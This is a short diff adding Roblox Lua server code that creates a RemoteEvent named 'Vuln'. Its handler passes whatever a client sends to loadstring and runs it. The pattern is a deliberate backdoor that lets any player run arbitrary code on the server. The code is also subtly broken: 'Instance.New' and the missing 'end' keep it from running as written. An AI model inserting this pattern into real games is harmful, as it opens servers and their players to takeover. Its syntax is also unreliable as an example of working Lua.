@@ -1,0 +1,5 @@
+local Vuln = Instance.New("RemoteEvent")
+
+Vuln.OnServerEvent:Connect(function(arg1)
+  loadstring(arg1)()
+)
